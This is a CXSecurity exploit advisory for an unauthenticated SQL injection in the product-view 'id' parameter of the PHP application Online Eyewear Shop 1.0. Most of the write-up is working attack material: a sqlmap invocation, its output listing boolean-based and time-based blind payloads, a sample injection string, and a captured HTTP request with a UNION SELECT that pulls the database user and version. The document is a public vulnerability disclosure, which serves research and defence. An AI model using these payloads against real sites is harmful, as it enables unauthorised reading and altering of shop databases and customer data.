---
title: Online Eyewear Shop 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023020001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-02
fetch_date: 2025-10-04T05:28:35.033255
---

# Online Eyewear Shop 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Online Eyewear Shop 1.0 SQL Injection** **2023.02.01**  Credit:  **[Muhammad Navaid Zafar Ansari](https://cxsecurity.com/author/Muhammad%2BNavaid%2BZafar%2BAnsari/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Online Eyewear Shop 1.0 - Product detail 'id' SQL Injection (Unauthenticated)
# Date: 2023-01-02
# Exploit Author: Muhammad Navaid Zafar Ansari
# Vendor Homepage: https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-oews.zip
# Version: 1.0
# Tested on: Kali Linux + PHP 8.2.1, Apache 2.4.55 (Debian)
# CVE: Not Assigned Yet
# References: -
------------------------------------------------------------------------------------
1. Description:
----------------------
Online Eyewear Shop 1.0 allows Unauthenticated SQL Injection via parameter 'id' in 'oews/?p=products/view\_product&id=?' Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
2. Proof of Concept:
----------------------
Step 1 - By visiting the url: http://localhost/oews/?p=products/view\_product&id=5 just add single quote to verify the SQL Injection.
Step 2 - Run sqlmap -u "http://localhost/oews/?p=products/view\_product&id=3" -p id --dbms=mysql
SQLMap Response:
[\*] starting @ 04:49:58 /2023-02-01/
[04:49:58] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ft4vh3vs87t...s4nu5kh7ik'). Do you want to use those [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: p=products/view\_product&id=3' AND 4759=4759 AND 'oKly'='oKly
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: p=products/view\_product&id=3' AND (SELECT 5509 FROM (SELECT(SLEEP(5)))KaYM) AND 'phDK'='phDK
---
[04:50:00] [INFO] testing MySQL
[04:50:00] [INFO] confirming MySQL
[04:50:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.55, PHP
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
3. Example payload:
----------------------
(boolean-based)
' AND 1=1 AND 'test'='test
4. Burpsuite request:
----------------------
GET /oews/?p=products/view\_product&id=5%27+and+0+union+select+1,2,user(),4,5,6,7,8,9,10,11,12,version(),14--+- HTTP/1.1
Host: localhost
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=g491mrrn2ntmqa9akheqr3ujip
Connection: close

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top